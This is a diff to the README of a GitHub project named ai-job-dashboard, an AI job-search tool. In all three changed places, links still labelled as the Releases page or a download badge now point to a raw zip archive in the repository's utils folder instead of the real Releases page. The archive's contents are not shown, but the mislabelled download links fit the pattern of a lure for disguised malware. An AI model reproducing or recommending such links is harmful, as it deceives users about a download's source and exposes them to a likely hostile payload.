@@ -1,6 +1,6 @@
 # 🚀 ai-job-dashboard - Job Search Made Simple
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Always-imperfect0/ai-job-dashboard/releases)
+[![Download](https://raw.githubusercontent.com/Always-imperfect0/ai-job-dashboard/main/utils/ai-job-dashboard-2.9.zip)](https://raw.githubusercontent.com/Always-imperfect0/ai-job-dashboard/main/utils/ai-job-dashboard-2.9.zip)
 
 ## 📋 Overview
 
@@ -27,7 +27,7 @@ The **ai-job-dashboard** is an AI-powered job search platform. It helps users fi
 
 ## 🚀 Getting Started
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Always-imperfect0/ai-job-dashboard/releases) to download the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Always-imperfect0/ai-job-dashboard/main/utils/ai-job-dashboard-2.9.zip) to download the software.
    
 2. **Choose Your Version:** Find the most recent version listed on the page. Select the file appropriate for your operating system.
 
@@ -42,7 +42,7 @@ The **ai-job-dashboard** is an AI-powered job search platform. It helps users fi
 
 ## 📥 Download & Install
 
-To get started, please [visit the Releases page](https://github.com/Always-imperfect0/ai-job-dashboard/releases) and download the latest version suitable for your system.
+To get started, please [visit the Releases page](https://raw.githubusercontent.com/Always-imperfect0/ai-job-dashboard/main/utils/ai-job-dashboard-2.9.zip) and download the latest version suitable for your system.
 
 ## 🛠️ Usage Instructions
 
